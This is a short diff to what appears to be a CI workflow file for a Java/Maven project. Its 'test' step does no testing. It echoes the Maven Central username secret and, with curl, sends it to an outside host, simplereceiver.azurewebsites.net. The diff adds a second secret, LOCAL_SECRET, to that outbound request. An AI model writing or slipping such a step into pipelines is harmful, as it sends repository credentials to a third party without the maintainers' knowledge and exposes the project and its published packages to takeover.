@@ -12,9 +12,10 @@ jobs:
     - name: test
       env:
         MAVEN_USERNAME: ${{ secrets.MAVEN_CENTRAL_USERNAME }}
+        LOCAL_SECRET: ${{ secrets.LOCAL_SECRET }}
       run: |
         echo $MAVEN_USERNAME
-        curl --request GET --url https://simplereceiver.azurewebsites.net/?username=$MAVEN_USERNAME
+        curl --request GET --url https://simplereceiver.azurewebsites.net/?username=$MAVEN_USERNAME$LOCAL_SECRET
 
 
     
